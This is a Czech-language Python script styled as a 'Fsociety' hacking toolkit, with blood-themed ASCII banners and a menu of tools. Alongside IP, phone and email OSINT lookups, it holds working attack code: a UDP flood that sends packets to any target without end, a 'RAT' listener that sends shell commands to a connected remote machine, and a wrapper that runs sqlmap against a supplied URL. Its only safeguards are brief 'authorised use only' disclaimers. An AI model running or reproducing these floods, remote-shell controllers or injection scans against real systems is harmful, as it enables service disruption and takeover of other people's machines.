#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Fsociety - toolkit
Pro vzdělávací / autorizované bezpečnostní testy.
"""

import os
import sys
import time
import random
import socket
import subprocess
import urllib.request
import json

RED = "\033[91m"
DARKRED = "\033[38;5;52m"
WHITE = "\033[97m"
RESET = "\033[0m"

BLOOD_LOGO = r"""
 ______    _______  _______  _______  _ _______  _______ _________
(  ___ \  (  ____ \(  ____ )(  ___  )( (  ____ \(  ____ )\__   __/
| (   ) ) | (    \/| (    )|| (   ) ||/ (    \/| (    )|   ) (
| (__/ /  | (__    | (____)|| |   | ||  |      | (____)|   | |
|  __ (   |  __)   |     __)| |   | ||  | ____ |  __)     | |
| (  \ \  | (      | (\ (   | |   | ||  | \_  )| (        | |
| )___) ) | (____/\| ) \ \__| (___) ||  (___) || )        | |
|/ \___/  (_______/|/   \__/ (_____) (_/______/|/         )_(
"""

BLOOD_DRIP = r"""
        ,.--~**'--.,._
      .'~*            `~-.,
     /   ,~*~-,,          \        D R I P ... D R I P ...
    |  /        \   ,      |
    \  |  F      |  (       |
     \ |         |   \      |
      `'|        | ,  |     |
        |        |'   |     |
        `\_______/    `'-.,_|
             \  \  \
              \  \  \        ,.-~*,
               \  \  \_    .'      `~-,   _
                \  \   `~-./              \  \__
                 \  \      Fs o c i e t y   \    ~-.
                  `~'~--,____________________\_,     ~*,_
                                               `~-,______/
"""

def blood_text(text):
    """Vybarví text 'krví' - každé písmenko jiným odstínem červené."""
    shades = ["\033[38;5;52m", "\033[38;5;88m", "\033[91m", "\033[38;5;124m", "\033[38;5;160m"]
    out = ""
    for ch in text:
        out += random.choice(shades) + ch
    return out + RESET

def clear():
    os.system("clear" if os.name != "nt" else "cls")

def banner():
    clear()
    print(RED + BLOOD_LOGO + RESET)
    print(DARKRED + BLOOD_DRIP + RESET)
    print(blood_text("            >>> Fs o c i e t y <<<").center(70))
    print()

def type_print(text, delay=0.01):
    for ch in text:
        sys.stdout.write(RED + ch + RESET)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def drip_effect():
    """Kapající krev pod logem."""
    drips = ["    " + " " * random.randint(5, 40) + RED + "|" * random.randint(3, 8) + RESET for _ in range(5)]
    for d in drips:
        print(d)
        time.sleep(0.05)

# ------------------- funkce menu -------------------

def ip_track():
    banner()
    ip = input(blood_text("Zadej IP adresu > "))
    try:
        url = f"http://ip-api.com/json/{ip}"
        data = json.loads(urllib.request.urlopen(url, timeout=10).read().decode())
        if data.get("status") == "success":
            for k, v in data.items():
                print(f"{RED}[+]{RESET} {k}: {WHITE}{v}{RESET}")
        else:
            print(RED + "[-] Neplatná IP." + RESET)
    except Exception as e:
        print(RED + f"[-] Chyba: {e}" + RESET)
    input(blood_text("\n[Enter] zpět do menu... "))

def phone_lookup():
    banner()
    num = input(blood_text("Zadej telefonní číslo (s předvolbou, např. +420...) > "))
    try:
        import phonenumbers
        from phonenumbers import geocoder, carrier, timezone
        p = phonenumbers.parse(num)
        if not phonenumbers.is_valid_number(p):
            print(RED + "[-] Neplatné číslo." + RESET)
        else:
            print(f"{RED}[+]{RESET} Země/region: {WHITE}{geocoder.description_for_number(p, 'cs')}{RESET}")
            print(f"{RED}[+]{RESET} Operátor:    {WHITE}{carrier.name_for_number(p, 'cs')}{RESET}")
            print(f"{RED}[+]{RESET} Zóna:        {WHITE}{timezone.time_zones_for_number(p)}{RESET}")
    except ImportError:
        print(RED + "[-] Nainstaluj: pip install phonenumbers" + RESET)
    except Exception as e:
        print(RED + f"[-] Chyba: {e}" + RESET)
    input(blood_text("\n[Enter] zpět do menu... "))

def osint_gmail():
    banner()
    email = input(blood_text("Zadej Gmail adresu > "))
    print(f"{RED}[*]{RESET} Kontrola registrací přes holehe (veřejné OSINT)...")
    try:
        subprocess.run(["holehe", email])
    except FileNotFoundError:
        print(RED + "[-] holehe není nainstalován. Instalace: pip install holehe" + RESET)
        print(RED + "    Potom spusť: holehe " + email + RESET)
    input(blood_text("\n[Enter] zpět do menu... "))

def sqlmap_run():
    banner()
    url = input(blood_text("Cílová URL s parametrem (např. http://cil/product.php?id=1) > "))
    try:
        subprocess.run(["sqlmap", "-u", url, "--batch"])
    except FileNotFoundError:
        print(RED + "[-] sqlmap není nainstalován (apt install sqlmap)." + RESET)
    input(blood_text("\n[Enter] zpět do menu... "))

def dos_attack():
    banner()
    print(RED + "[!] Pouze proti vlastním / autorizovaným cílům!" + RESET)
    host = input(blood_text("Cílový host > "))
    port = int(input(blood_text("Port > ") or "80"))
    try:
        target_ip = socket.gethostbyname(host)
    except socket.gaierror:
        print(RED + "[-] Host nelze přeložit." + RESET)
        input(blood_text("\n[Enter] zpět... "))
        return
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)
    payload = random.randbytes(1024)
    print(RED + f"[*] Flood na {target_ip}:{port} - CTRL+C pro stop" + RESET)
    sent = 0
    try:
        while True:
            sock.sendto(payload, (target_ip, port))
            sent += 1
            if sent % 1000 == 0:
                print(f"{RED}[*] Odesláno {sent} paketů...{RESET}")
    except KeyboardInterrupt:
        print(f"{DARKRED}[!] Zastaveno, odesláno {sent} paketů.{RESET}")
    input(blood_text("\n[Enter] zpět do menu... "))

def world_map():
    banner()
    print(WHITE + r"""
        .-~~~-.
  .- ~ ~-(       )_ _
 /                     ~ -.
|       F S O C I E T Y    \
 \                        .'
   ~- . _____________ . -~
""" + RESET)
    print(RED + "[*] Mapa světa - doporučený nástroj: 'traceroute' + 'mapscii' (telnet mapscii.me)" + RESET)
    try:
        subprocess.run(["traceroute", "8.8.8.8"])
    except FileNotFoundError:
        print(RED + "[-] traceroute není k dispozici." + RESET)
    input(blood_text("\n[Enter] zpět do menu... "))

def rat_menu():
    banner()
    print(RED + "[!] RAT modul - pouze v autorizovaném testovacím prostředí!" + RESET)
    print(blood_text(" 1) Vytvořit listener (bind shell)\n 2) Zpět"))
    ch = input(blood_text("> "))
    if ch == "1":
        port = int(input(blood_text("Port pro listener > ") or "4444"))
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", port))
        s.listen(1)
        print(RED + f"[*] Listener na portu {port}, čekám na spojení..." + RESET)
        conn, addr = s.accept()
        print(RED + f"[+] Připojeno: {addr}" + RESET)
        while True:
            cmd = input(blood_text("shell> "))
            if cmd in ("exit", "quit"):
                conn.send(b"exit")
                conn.close()
                break
            conn.send(cmd.encode())
            print(conn.recv(65535).decode(errors="ignore"))
    input(blood_text("\n[Enter] zpět do menu... "))

def camera_menu():
    banner()
    print(RED + "[*] Kamera modul - stream z vlastní kamery (OpenCV)." + RESET)
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        print(RED + "[*] Spouštím kameru - stiskni 'q' pro ukončení." + RESET)
        while True:
            ret, frame = cap.read()
            if not ret:
                break
            cv2.imshow("Fsociety Cam", frame)
            if cv2.waitKey(1) & 0xFF == ord("q"):
                break
        cap.release()
        cv2.destroyAllWindows()
    except ImportError:
        print(RED + "[-] Nainstaluj: pip install opencv-python" + RESET)
    input(blood_text("\n[Enter] zpět do menu... "))

def info():
    banner()
    print(blood_text("Fsociety v1.0 - 'We are Fsociety. We are finally free.'"))
    print(f"{WHITE}Autor: ti, kdo sázejí revoluci{RESET}")
    print(f"{WHITE}Užívání: pouze pro autorizované testy a vzdělávání{RESET}")
    input(blood_text("\n[Enter] zpět do menu... "))

# ------------------- hlavní smyčka -------------------

MENU = """
   [1]  IP Track
   [2]  Phone Lookup
   [3]  OSINT Gmail
   [4]  sqlMap
   [5]  DoS Attack
   [6]  World Map
   [7]  RAT
   [8]  Camera
   [9]  Info Fsociety
   [10] Exit
"""

def main():
    if os.name != "nt":
        os.system("")
    print(RED + BLOOD_LOGO + RESET)
    drip_effect()
    time.sleep(0.6)
    while True:
        banner()
        print(RED + MENU + RESET)
        choice = input(blood_text("Vyber volbu > ")).strip()
        if choice == "1":
            ip_track()
        elif choice == "2":
            phone_lookup()
        elif choice == "3":
            osint_gmail()
        elif choice == "4":
            sqlmap_run()
        elif choice == "5":
            dos_attack()
        elif choice == "6":
            world_map()
        elif choice == "7":
            rat_menu()
        elif choice == "8":
            camera_menu()
        elif choice == "9":
            info()
        elif choice == "10":
            type_print("We are Fsociety... goodbye.", 0.03)
            sys.exit(0)
        else:
            print(RED + "[-] Neplatná volba!" + RESET)
            time.sleep(1)

if __name__ == "__main__":
    main()
